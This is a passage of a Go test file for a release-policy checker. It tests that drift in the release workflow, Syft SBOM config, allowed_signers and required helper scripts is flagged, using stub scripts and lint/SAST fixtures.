	findings := mustFindingsForWorkflow(t, mustReplaceOnce(t, base, original, swapped))
	assertOnlyFinding(t, findings, "release.yml:jobs.verify-tag.steps", "steps must exactly match")
}

func TestReleasePolicyRejectsNonExecutableRequiredScripts(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	mustChmod(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "scripts/validate-cyclonedx-sbom.sh", "required release helper must be executable")
}

func TestReleasePolicyRejectsSymlinkRequiredScripts(t *testing.T) {
	tests := []struct {
		name   string
		target string
	}{
		{name: "existing target", target: "release-tag-policy.sh"},
		{name: "dangling target", target: "missing.sh"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repoRoot := t.TempDir()
			mustWriteReleasePolicyRepoFixture(t, repoRoot)
			helperPath := filepath.Join(repoRoot, "scripts", "go-tool.sh")
			if err := os.Remove(helperPath); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(tt.target, helperPath); err != nil {
				t.Fatal(err)
			}

			findings, err := checkRepo(repoRoot)
			if err != nil {
				t.Fatal(err)
			}
			assertFinding(t, findings, "scripts/go-tool.sh", "required release helper must be a regular file")
		})
	}
}

func TestReleasePolicyRejectsMissingRequiredSupportFile(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	if err := os.Remove(filepath.Join(repoRoot, "scripts", "go-tool-versions.sh")); err != nil {
		t.Fatal(err)
	}

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "scripts/go-tool-versions.sh", "missing required release support file")
}

func TestReleasePolicyRejectsMissingRequiredConfig(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	if err := os.Remove(filepath.Join(repoRoot, ".github", "syft-release.yaml")); err != nil {
		t.Fatal(err)
	}

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/syft-release.yaml", "missing required release config")
}

func TestReleasePolicyRejectsSymlinkRequiredConfig(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	configPath := filepath.Join(repoRoot, ".github", "syft-release.yaml")
	targetPath := filepath.Join(repoRoot, ".github", "syft-target.yaml")
	mustWriteFile(t, targetPath, []byte(acceptedSyftReleaseConfig), 0o644)
	if err := os.Remove(configPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(targetPath, configPath); err != nil {
		t.Fatal(err)
	}

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/syft-release.yaml", "required release config must not be a symlink")
}

func TestReleasePolicyRejectsNonRegularRequiredConfig(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("unix sockets are not available on windows")
	}
	repoRoot, err := os.MkdirTemp("/tmp", "releasepolicy-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(repoRoot); err != nil {
			t.Error(err)
		}
	})
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	configPath := filepath.Join(repoRoot, ".github", "syft-release.yaml")
	if err := os.Remove(configPath); err != nil {
		t.Fatal(err)
	}
	listener, err := net.Listen("unix", configPath)
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/syft-release.yaml", "required release config must be a regular file")
}

func TestReleasePolicyRejectsDriftingSyftReleaseConfig(t *testing.T) {
	tests := []struct {
		name     string
		in       string
		want     string
		wantPath string
	}{
		{
			name: "wrong source",
			in: `source:
  name: github.com/the-sarge/other
exclude:
  - './.git/**'
  - './.ras/**'
`,
			want:     `want "github.com/the-sarge/cpace"`,
			wantPath: ".github/syft-release.yaml:source.name",
		},
		{
			name: "missing shared exclude",
			in: `source:
  name: github.com/the-sarge/cpace
exclude:
  - './.git/**'
`,
			want:     "sequence must exactly match accepted release policy",
			wantPath: ".github/syft-release.yaml:exclude",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repoRoot := t.TempDir()
			mustWriteReleasePolicyRepoFixture(t, repoRoot)
			mustWriteFile(t, filepath.Join(repoRoot, ".github", "syft-release.yaml"), []byte(tt.in), 0o644)

			findings, err := checkRepo(repoRoot)
			if err != nil {
				t.Fatal(err)
			}
			assertFinding(t, findings, tt.wantPath, tt.want)
		})
	}
}

func TestReleasePolicyRejectsUnexpectedAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(newAcceptedReleasePolicy().expectedSigners+"the-sarge@the-sarge.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake\n"), 0o644)

	findings := checkAllowedSigners(repoRoot, newAcceptedReleasePolicy())
	assertFinding(t, findings, ".github/allowed_signers", "allowed_signers must exactly match")
}

func TestReleasePolicyAcceptsCRLFAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(strings.ReplaceAll(newAcceptedReleasePolicy().expectedSigners, "\n", "\r\n")), 0o644)

	findings := checkAllowedSigners(repoRoot, newAcceptedReleasePolicy())
	if len(findings) > 0 {
		t.Fatalf("expected CRLF-normalized allowed_signers to pass, got %#v", findings)
	}
}

const acceptedSyftReleaseConfig = `source:
  name: github.com/the-sarge/cpace
exclude:
  - './.git/**'
  - './.ras/**'
`

const acceptedScanTaskfile = `version: "3"

vars:
  GOSEC: '{{.GOSEC | default "gosec"}}'
  GOLANGCI_ARGS: '{{.GOLANGCI_ARGS | default ""}}'

tasks:
  gosec:
    desc: Run gosec scan
    cmds:
      # Policy: this command owns scan-scope flags for every gosec lane.
      - "{{.GOSEC}} -tests ./..."

  lint:golangci:
    desc: Run the curated golangci-lint analyzer set, including gosec and staticcheck
    cmds:
      - task: lint:config-check
      # Policy: this command owns scan-scope and output flags for every golangci-lint lane.
      - '{{if .GOLANGCI_LINT}}{{.GOLANGCI_LINT}} run {{.GOLANGCI_ARGS}}{{else}}"{{.GO_TOOL}}" run golangci-lint run {{.GOLANGCI_ARGS}}{{end}}'
`

const acceptedSASTWorkflow = `name: SAST Gate

jobs:
  sast-gate:
    steps:
      - name: Install task
        run: scripts/go-tool.sh install task
      - name: Run golangci-lint
        id: sast
        continue-on-error: true
        run: task lint:golangci GOLANGCI_LINT=golangci-lint GOLANGCI_ARGS='--output.text.path stdout --output.sarif.path golangci.sarif'
      - name: Report golangci-lint result
        if: steps.sast.outcome == 'failure'
        run: exit 1
`

func mustWriteReleasePolicyRepoFixture(t *testing.T, repoRoot string) {
	t.Helper()
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(acceptedScanTaskfile), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(acceptedSASTWorkflow), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "release.yml"), []byte(mustReadCurrentWorkflow(t)), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(newAcceptedReleasePolicy().expectedSigners), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "syft-release.yaml"), []byte(acceptedSyftReleaseConfig), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "go-tool-versions.sh"), []byte("cpace_go_tool_version=v1.0.0\n"), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "go-tool.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-policy.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "extract-release-notes.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
}

func mustReadCurrentWorkflow(t *testing.T) string {
	t.Helper()
	in, err := os.ReadFile(filepath.Join("..", "..", ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	return string(in)
}

func mustFindingsForWorkflow(t *testing.T, in string) []finding {
	t.Helper()
	return mustFindingsForWorkflowAgainstPolicy(t, in, newAcceptedReleasePolicy())
}

func mustFindingsForWorkflowAgainstPolicy(t *testing.T, in string, policy releasePolicy) []finding {
	t.Helper()
	var doc yaml.Node
	if err := yaml.Unmarshal([]byte(in), &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Content) != 1 {
		t.Fatalf("expected one YAML document, got %d", len(doc.Content))
	}
	return checkWorkflowAgainstPolicy("release.yml", doc.Content[0], policy)
}

func assertFinding(t *testing.T, findings []finding, wantPath, wantMsg string) {
	t.Helper()
	if wantPath == "" || wantMsg == "" {
		t.Fatalf("finding expectation requires a path and message")
	}
	for _, f := range findings {
		if f.path == wantPath && strings.Contains(f.msg, wantMsg) {
			return
		}
	}
	t.Fatalf("finding got %#v want path %q with message containing %q", findings, wantPath, wantMsg)
}

func assertOnlyFinding(t *testing.T, findings []finding, wantPath, wantMsg string) {
	t.Helper()
	if len(findings) != 1 {
		t.Fatalf("finding count got %d want 1: %#v", len(findings), findings)
	}
	assertFinding(t, findings, wantPath, wantMsg)
}

func countFindingsContaining(findings []finding, want string) int {
	var count int
	for _, finding := range findings {
		if strings.Contains(finding.path, want) || strings.Contains(finding.msg, want) {
			count++
		}
	}
	return count
}

func mustReplaceOnce(t *testing.T, in, old, new string) string {
	t.Helper()
	if !strings.Contains(in, old) {
		t.Fatalf("test fixture did not contain %q", old)
	}
	return strings.Replace(in, old, new, 1)
}

func mustWriteFile(t *testing.T, path string, content []byte, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, content, mode); err != nil {
		t.Fatal(err)
	}
}

func mustChmod(t *testing.T, path string, mode os.FileMode) {
	t.Helper()
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

// mustReplaceActionRef locates a scalar through the YAML parser so fixtures do not
// depend on a current action pin or its trailing version comment.
func mustReplaceActionRef(t *testing.T, in, prefix, replacement string) string {
	t.Helper()
	var doc yaml.Node
	if err := yaml.Unmarshal([]byte(in), &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Content) != 1 {
		t.Fatalf("YAML document count got %d want 1", len(doc.Content))
	}
	for _, action := range actionUses(mapping(doc.Content[0], "jobs")) {
		if strings.HasPrefix(action.uses, prefix) {
			return mustReplaceOnce(t, in, action.uses, replacement)
		}
	}
	t.Fatalf("missing action with prefix %q", prefix)
	return ""
}
